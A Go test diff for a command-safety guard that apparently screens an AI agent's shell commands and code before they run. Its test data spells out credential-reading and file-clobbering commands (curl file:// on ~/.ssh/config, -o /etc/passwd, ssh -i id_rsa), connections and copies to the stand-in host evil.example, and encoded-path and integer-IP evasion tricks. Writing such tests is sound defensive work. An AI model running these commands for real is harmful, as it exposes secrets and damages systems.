@@ -122,6 +122,68 @@ func TestGuardHandlesCaseSensitiveAttachedConfigOptions(t *testing.T) {
 	}
 }
 
+func TestGuardScansFileURLsAndPathValuedOptions(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com", "intranet"}
+	guard := mustGuard(t, policy)
+	for _, command := range []string{
+		"curl file:///home/user/.ssh/config",
+		"curl file:///home/user/%2essh/config",
+		"curl -o/etc/passwd https://api.github.com/data",
+		"curl --output=/etc/passwd https://api.github.com/data",
+		"curl -o /etc/passwd https://api.github.com/data",
+		"curl -K/home/user/.ssh/config",
+		"curl --config=/home/user/.ssh/config",
+		"wget -O/etc/passwd https://api.github.com/data",
+		"wget --output-document=/etc/passwd https://api.github.com/data",
+		"ssh -F/home/user/.ssh/config intranet",
+		"ssh -i /home/user/.ssh/id_rsa intranet",
+	} {
+		report := guard.Scan(safety.Request{Command: command})
+		require.Equal(t, safety.DecisionDeny, report.Decision, command)
+		require.Equal(t, "sensitive.path", report.RuleID, command)
+	}
+}
+
+func TestGuardExtractsCommandAwareNetworkDestinations(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com", "intranet"}
+	guard := mustGuard(t, policy)
+	tests := []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{"curl output then URL", "curl -o report.txt https://api.github.com/data", safety.DecisionAllow, "safety.no_findings"},
+		{"curl value option then URL", "curl --max-time 5 https://api.github.com/data", safety.DecisionAllow, "safety.no_findings"},
+		{"curl boolean option then URL", "curl -i https://api.github.com/data", safety.DecisionAllow, "safety.no_findings"},
+		{"wget output then URL", "wget -O report.txt https://api.github.com/data", safety.DecisionAllow, "safety.no_findings"},
+		{"wget value option then URL", "wget --timeout 5 https://api.github.com/data", safety.DecisionAllow, "safety.no_findings"},
+		{"wget boolean option then URL", "wget -q https://api.github.com/data", safety.DecisionAllow, "safety.no_findings"},
+		{"ssh option then single host", "ssh -p 22 intranet", safety.DecisionAllow, "safety.no_findings"},
+		{"ssh denied single host", "ssh internal-only", safety.DecisionDeny, "network.destination"},
+		{"scp local to remote", "scp README.md api.github.com:/tmp/x", safety.DecisionAllow, "safety.no_findings"},
+		{"scp remote denied", "scp README.md evil.example:/tmp/x", safety.DecisionDeny, "network.destination"},
+		{"scp local operands", "scp README.md checkout.dir", safety.DecisionAllow, "safety.no_findings"},
+		{"git clone local destination", "git clone https://api.github.com/x checkout.dir", safety.DecisionAllow, "safety.no_findings"},
+		{"git clone options", "git clone --depth 1 --branch main https://api.github.com/x checkout.dir", safety.DecisionAllow, "safety.no_findings"},
+		{"git clone options denied remote", "git clone --depth 1 https://evil.example/x checkout.dir", safety.DecisionDeny, "network.destination"},
+		{"nc host then port", "nc api.github.com 443", safety.DecisionAllow, "safety.no_findings"},
+		{"curl integer IPv4", "curl 2130706433", safety.DecisionDeny, "network.destination"},
+		{"curl unparseable destination", "curl ://broken", safety.DecisionNeedsHumanReview, "network.destination_unparsed"},
+		{"curl version only", "curl --version", safety.DecisionAllow, "safety.no_findings"},
+		{"git status", "git status", safety.DecisionAllow, "safety.no_findings"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision)
+			require.Equal(t, tc.rule, report.RuleID)
+		})
+	}
+}
+
 func TestGuardScansInlineInterpreterPayloads(t *testing.T) {
 	policy := safety.DefaultPolicy()
 	policy.NetworkAllowlist = []string{"github.com"}
@@ -158,6 +220,39 @@ func TestGuardScansSchemelessCodeNetworkLiterals(t *testing.T) {
 		require.Equal(t, safety.DecisionDeny, report.Decision, block.Language)
 		require.Equal(t, "network.destination", report.RuleID, block.Language)
 	}
+}
+
+func TestGuardScopesCodeDestinationsToNetworkCalls(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com"}
+	guard := mustGuard(t, policy)
+	for _, block := range []codeexecutor.CodeBlock{
+		{Language: "python", Code: `print("https://evil.example", "report.txt")`},
+		{Language: "go", Code: `fmt.Println("https://evil.example", "report.txt")`},
+		{Language: "javascript", Code: `console.log("https://evil.example", "report.txt")`},
+		{Language: "go", Code: `fmt.Println("report.txt"); net.Dial("tcp", "api.github.com:443")`},
+		{Language: "javascript", Code: `net.connect({path: "report.txt"})`},
+		{Language: "go", Code: `fmt.Println("net.Dial(\"tcp\", \"evil.example:443\")")`},
+	} {
+		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{block}})
+		require.Equal(t, safety.DecisionAllow, report.Decision, block.Language)
+	}
+
+	for _, block := range []codeexecutor.CodeBlock{
+		{Language: "python", Code: `print("report.txt"); socket.create_connection(("evil.example", 443))`},
+		{Language: "go", Code: `fmt.Println("report.txt"); net.Dial("tcp", "evil.example:443")`},
+		{Language: "javascript", Code: `console.log("report.txt"); net.connect(443, "evil.example")`},
+	} {
+		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{block}})
+		require.Equal(t, safety.DecisionDeny, report.Decision, block.Language)
+		require.Equal(t, "network.destination", report.RuleID, block.Language)
+	}
+
+	dynamic := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{{
+		Language: "go", Code: `net.Dial("tcp", target)`,
+	}}})
+	require.Equal(t, safety.DecisionNeedsHumanReview, dynamic.Decision)
+	require.Equal(t, "network.dynamic_destination", dynamic.RuleID)
 }
 
 func TestGuardEnforcesResourcePolicy(t *testing.T) {
